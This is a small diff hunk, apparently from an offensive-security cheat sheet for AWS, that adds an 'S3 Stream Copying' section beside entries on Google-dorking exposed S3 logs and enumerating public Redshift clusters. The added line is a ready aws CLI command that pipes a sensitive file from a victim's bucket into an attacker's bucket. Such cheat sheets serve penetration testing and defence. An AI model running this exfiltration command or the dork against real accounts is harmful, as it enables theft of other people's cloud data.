@@ -68,6 +68,12 @@ S3 Log Google Dorking
 s3 site:amazonaws.com filetype:log
 ```
 
+S3 Stream Copying
+
+```sh
+aws s3 cp --profile victim s3://victim/sensitive.txt - | (aws s3 cp --profile attacker  - s3://attacker/sensitive.txt )
+```
+
 Public Redshift Cluster Enumeration
 
 ```sh
